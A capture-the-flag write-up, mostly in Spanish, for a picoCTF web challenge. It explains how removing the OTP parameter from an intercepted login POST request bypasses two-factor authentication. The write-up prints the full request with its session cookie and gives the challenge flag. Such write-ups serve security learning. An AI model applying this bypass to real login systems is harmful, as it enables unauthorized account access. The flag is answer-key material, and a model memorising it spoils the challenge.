## Descripción 
Additional details will be available after launching your challenge instance.
Try [here](http://titan.picoctf.net:60989/) to find the flag

Hint:
1. Try using burpsuite to intercept request to capture the flag.
2. Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.
## Solución 1

Para resolver este reto, primero interceptamos la petición POST con Burp después de poner los datos. Luego en la petición eliminamos el parámetro `OTP` de la petición antes de enviarla al servidor. Como el servidor está mal programado, al no recibir el OTP simplemente omite la validación del 2fa y nos deja entrar

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:56853
Content-Length: 13
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://titan.picoctf.net:56853
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:56853/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwljUsOgzAMRO-SdRckkF_3PQcyJGlLwUGJESpV716jLmfG7_kjxie9xVUcGO4HobiIsZbUU35F5BosaCVbBSCNBul86xrduGSCk4NOXtngrZGBubTNc4-wRMb2MsRyyjKtHHXnre84rlDrnks4H05EU6TpdtaPjLHHbWGKJ6naThvrfMPbVtn0t2I8kPji-wPVeTf9.Z_H3YA.JtV4iXJxFgJh8bFSwYqWfFBAK00
Connection: keep-alive

otp=123456789

borramos otp y nos da la flag

flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```
